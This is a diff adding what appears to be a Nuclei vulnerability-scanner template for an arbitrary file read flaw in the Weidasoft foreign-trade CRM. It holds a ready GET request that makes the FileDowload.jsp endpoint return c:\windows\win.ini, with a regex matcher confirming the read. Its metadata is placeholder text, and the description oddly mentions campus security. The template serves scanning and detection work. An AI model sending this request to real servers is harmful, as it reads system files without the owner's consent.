@@ -1,0 +1,33 @@
+id: weidasoft-crm-filedowload-fileread
+info:
+  name: 维达外贸客户关系管理系统FileDowload存在任意文件读取漏洞
+  author: leadlife
+  severity: high
+  description: 维达外贸客户关系管理系统 FileDowload存在任意文件读取漏洞，攻击者可以通过精心构造的请求参数，绕过权限验证，直接读取服务器上的敏感文件内容。该漏洞可能导致系统配置文件、用户数据或其他关键信息的泄露，进而为攻击者提供进一步入侵系统的可能性，严重威胁校园信息安全。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/wggiu9phcg2aggo5
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: fileread,weidasoft
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/../file/FileDowload.jsp?url=c:\\windows\\win.ini"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "\\[(font|extension|file)s\\]"
+
+      - type: status
+        status:
+          - 200
